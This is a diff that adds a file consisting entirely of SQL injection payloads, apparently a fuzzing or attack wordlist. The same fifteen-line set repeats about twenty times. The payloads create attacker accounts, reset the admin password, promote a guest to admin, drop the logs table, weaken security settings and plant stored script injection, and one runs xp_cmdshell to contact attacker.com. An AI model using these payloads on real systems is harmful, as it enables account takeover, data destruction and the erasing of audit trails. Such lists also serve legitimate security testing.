@@ -1,0 +1,300 @@
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
